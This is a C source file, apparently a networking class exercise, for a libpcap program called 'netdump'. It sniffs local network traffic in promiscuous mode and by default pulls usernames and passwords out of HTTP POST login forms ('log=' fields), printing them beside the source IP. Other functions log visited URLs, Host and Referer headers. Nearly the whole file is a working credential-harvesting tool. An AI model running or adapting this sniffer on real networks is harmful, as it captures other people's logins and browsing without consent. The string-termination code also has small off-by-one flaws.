#define RETSIGTYPE void
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <pcap.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>

#ifndef setsignal_h
#define setsignal_h

RETSIGTYPE (*setsignal(int, RETSIGTYPE (*)(int)))(int);
#endif

char cpre580f98[] = "netdump";

void raw_print(u_char *user, const struct pcap_pkthdr *h, const u_char *p);
void print_pw(const u_char *p, char * tcp_data);
void print_url(const u_char *p, char * tcp_data);
void print_hdr(const u_char *p, char * tcp_data);
// extern unsigned char * base64_decode(const unsigned char *src, size_t len, size_t *out_len);

int packettype;

char *program_name;

/* Externs */
PCAP_API void bpf_dump(const struct bpf_program *, int);

extern char *copy_argv(char **);

/* Forwards */
 void program_ending(int);

/* Length of saved portion of packet. */
int snaplen = 1518;

static pcap_t *pd;

extern int optind;
extern int opterr;
extern char *optarg;
// Default if to sniff passwords
int pflag = 1, aflag = 0, uflag=0, hflag=0;
u_int num_arp = 0, num_ip = 0;
u_long num_packets=0;
char *post_ptr, *get_ptr, *host_ptr, *ref_ptr;
char url[250];

int
main(int argc, char **argv)
{
	int cnt, op, i, done = 0;
	bpf_u_int32 localnet, netmask;
	char *cp, *cmdbuf, *device;
	struct bpf_program fcode;
	 void (*oldhandler)(int);
	u_char *pcap_userdata;
	char ebuf[PCAP_ERRBUF_SIZE];

	cnt = -1;
	device = NULL;
	
	if ((cp = strrchr(argv[0], '/')) != NULL)
		program_name = cp + 1;
	else
		program_name = argv[0];

	opterr = 0;
	while ((i = getopt(argc, argv, "pauh")) != -1)
	{
		switch (i)
		{
		case 'p':  //password sniffing
			pflag = 1;
		break;
		case 'a':  //print all
			aflag = 1;
		break;
		case 'h':  //print all
			hflag = 1;
		break;
		case 'u': //Print all POST and GET packets
			uflag = 1;
			printf("Printing URLS\n");
		break;
		case '?':
		default:
			done = 1;
		break;
		}
		if (done) break;
	}
	if (argc > (optind)) cmdbuf = copy_argv(&argv[optind]);
		else cmdbuf = "";

	if (device == NULL) {
		device = pcap_lookupdev(ebuf);
		if (device == NULL)
			error("%s", ebuf);
	}
	pd = pcap_open_live(device, snaplen,  1, 1000, ebuf);
	if (pd == NULL)
		error("%s", ebuf);
	i = pcap_snapshot(pd);
	if (snaplen < i) {
		warning("snaplen raised from %d to %d", snaplen, i);
		snaplen = i;
	}
	if (pcap_lookupnet(device, &localnet, &netmask, ebuf) < 0) {
		localnet = 0;
		netmask = 0;
		warning("%s", ebuf);
	}
	/*
	 * Let user own process after socket has been opened.
	 */
	setuid(getuid());

	if (pcap_compile(pd, &fcode, cmdbuf, 1, netmask) < 0)
		error("%s", pcap_geterr(pd));
	
	(void)setsignal(SIGTERM, program_ending);
	(void)setsignal(SIGINT, program_ending);
	/* Cooperate with nohup(1) */
	if ((oldhandler = setsignal(SIGHUP, program_ending)) != SIG_DFL)
		(void)setsignal(SIGHUP, oldhandler);

	if (pcap_setfilter(pd, &fcode) < 0)
		error("%s", pcap_geterr(pd));
	pcap_userdata = 0;
	(void)fprintf(stderr, "%s: listening on %s\n", program_name, device);
	if (pcap_loop(pd, cnt, raw_print, pcap_userdata) < 0) {
		(void)fprintf(stderr, "%s: pcap_loop: %s\n",
		    program_name, pcap_geterr(pd));
		exit(1);
	}
	pcap_close(pd);
	exit(0);
}

/* routine is executed on exit */
void program_ending(int signo)
{
	struct pcap_stat stat;

	if (pd != NULL && pcap_file(pd) == NULL) {
		(void)fflush(stdout);
		putc('\n', stderr);
		printf("\n");
		printf("Number packets = %ld\n", num_packets);
		printf("Number ARP = %d\n", num_arp);
		printf("Number IP = %d\n", num_ip);
		if (pcap_stats(pd, &stat) < 0)
			(void)fprintf(stderr, "pcap_stats: %s\n",
			    pcap_geterr(pd));
		else {
			(void)fprintf(stderr, "%d packets received by filter\n",
			    stat.ps_recv);
			(void)fprintf(stderr, "%d packets dropped by kernel\n",
			    stat.ps_drop);
		}
	}
	exit(0);
}

/* Like default_print() but data need not be aligned */
void
default_print_unaligned(register const u_char *cp, register u_int length)
{
	register u_int i, s;
	register int nshorts;

	nshorts = (u_int) length / sizeof(u_short);
	i = 0;
	while (--nshorts >= 0) {
		if ((i++ % 8) == 0)
			(void)printf("\n\t\t\t");
		s = *cp++;
		(void)printf(" %02x%02x", s, *cp++);
	}
	if (length & 1) {
		if ((i % 8) == 0)
			(void)printf("\n\t\t\t");
		(void)printf(" %02x", *cp);
	}
}

/*
 * By default, print the packet out in hex.
 */
void
default_print(register const u_char *bp, register u_int length)
{
	register const u_short *sp;
	register u_int i;
	register int nshorts;

	if ((long)bp & 1) {
		default_print_unaligned(bp, length);
		return;
	}
	sp = (u_short *)bp;
	nshorts = (u_int) length / sizeof(u_short);
	i = 0;
	while (--nshorts >= 0) {
		if ((i++ % 8) == 0)
			(void)printf("\n\t");
		(void)printf(" %04x", ntohs(*sp++));
	}
	if (length & 1) {
		if ((i % 8) == 0)
			(void)printf("\n\t");
		(void)printf(" %02x", *(u_char *)sp);
	}
}

/*
insert your code in this routine

*/

void raw_print(u_char *user, const struct pcap_pkthdr *h, const u_char *p)
{
        u_int length = h->len;
        u_int caplen = h->caplen;
	u_short eth_type, ip_len;
	u_char ip_hdr_len, tcp_hdr_len;
	int i, ptr, tcp_index, data_index, data_len, d_ptr;
	char tcp_data[1500], name[100];
	size_t pw_len, out_len;

//        default_print(p, caplen);
	eth_type = p[12]*256+p[13];
	if (eth_type != 0x800) return;
        if ((p[14] & 0xf0) != 0x40) return;
// IPv4 packet
	if (p[23] != 6) return;
//TCP packet
	ip_hdr_len = (p[14] &0xf)*4;
	tcp_index = 14 + ip_hdr_len;
	tcp_hdr_len = ((p[tcp_index + 12] >> 4) &0xf) *4;
	data_index = tcp_index + tcp_hdr_len;
	ip_len = p[16] * 256 + p[17];
	data_len = ip_len - ip_hdr_len - tcp_hdr_len;
	if (data_len == 0) return;
	if (data_len > 1500 ) data_len = 1500; // should not happen
// TCP packet with data
// printf("\n%d:%d:%d:%d:",ip_hdr_len, tcp_hdr_len, data_index, data_len);
// convert data part into a string
	d_ptr = 0;
	for (i = 0; i< data_len; i++) {
		ptr = i + data_index;
		if (p[ptr] == '\n') tcp_data[d_ptr++] = p[ptr];
		if (p[ptr] == '\r') tcp_data[d_ptr++] = p[ptr];
		if (!isprint(p[ptr])) continue;
		tcp_data[d_ptr++] = p[ptr];
	}
	tcp_data[d_ptr] = 0; // create a string
//Load srings for printing
	post_ptr = strstr(tcp_data, "POST");
	get_ptr = strstr(tcp_data, "GET");
	host_ptr = strstr(tcp_data, "Host:");
	ref_ptr = strstr(tcp_data, "Referer:");
	if (pflag) print_pw(p, tcp_data); // print passwords
	if (uflag) print_url(p,tcp_data); // print URLs
	if (hflag) print_hdr(p,tcp_data); // print HDR
	if (aflag) printf("%s\n", tcp_data);
	fflush(stdout);
//        default_print(p, caplen);

}

int line_len(char * str)
{
	int i=0 , len;

	len = strlen(str);
	if (len == 0) return 0;

	while (i < len) {
		if ((str[i] == '\n') || (str[i] == '\r')) {
			return i;
		}
		i++;
	}
	return i;
}

void print_pw(const u_char *p, char * tcp_data)
{
	char *auth_ptr, *user_pw;
	char user[50], pw[50];
	int i = 0, j = 0, pw_len, auth_len;
	if (post_ptr == NULL) return; // only pw in post command
	auth_ptr = strstr(tcp_data, "log=");
	if (auth_ptr == NULL) return; // log= not found
	auth_len = strlen((const char *) auth_ptr);
// get username
	while (i <auth_len) {
		if (auth_ptr[i] == '&') {
			user[i] = 0;
			break;
		}
		user[i] = auth_ptr[i];
		if (i == 49) {
			user[i] = 0;
			break;
		}
		i++;
	}
	i++;
// get password
	while (i <auth_len) {
		if (auth_ptr[i] == '&') {
			pw[j] = 0;
			break;
		}
		if (j == 49) {
			pw[j] = 0;
			break;
		}
		pw[j++] = auth_ptr[i++];
	}
	printf("Source IP: %d.%d.%d.%d  ",p[26], p[27], p[28], p[29]);
	printf("Username: %s Password: %s \r\n", user, pw);
}

//
// Print Source IP, HOST, URL, Referrer 
//

void print_url(const u_char *p, char * tcp_data)
{
	char host_str[250], ref_str[250], method_str[250];
	int len;

// NULL strings in case they don't exist
	host_str[0] = 0;
	ref_str[0] = 0;
	method_str[0] = 0;

	if ((post_ptr == NULL) && (get_ptr == NULL)) return; // does not contain a URL

	if (post_ptr != NULL) {
		len = line_len(post_ptr);
		if (len >= 250) len = 249;
		strncpy(method_str, post_ptr, len);
		method_str[len+1] = 0;
	}
	if (get_ptr != NULL) {
		len = line_len(get_ptr);
		if (len >= 250) len = 249;
		strncpy(method_str, get_ptr, len);
		method_str[len+1] = 0;
	}
	if (host_ptr != NULL) {
		len = line_len(host_ptr);
		if (len >= 250) len = 249;
		strncpy(host_str, host_ptr, len);
		host_str[len+1] = 0;
	}
	if (ref_ptr != NULL) {
		len = line_len(ref_ptr);
		if (len >= 250) len = 249;
		strncpy(ref_str, ref_ptr, len);
		ref_str[len+1] = 0;
	}
	printf("Source IP: %d.%d.%d.%d  ",p[26], p[27], p[28], p[29]);
	printf(" URL = %s %s %s\n", host_str, method_str, ref_str);

}
//
// TBD
// Harder to do, need to look for both cmd strings and response codes
//
void print_hdr(const u_char *p, char * tcp_data)
{
	if (post_ptr != NULL) printf("%s\n", post_ptr);
	if (get_ptr != NULL) printf("%s\n", get_ptr);

}

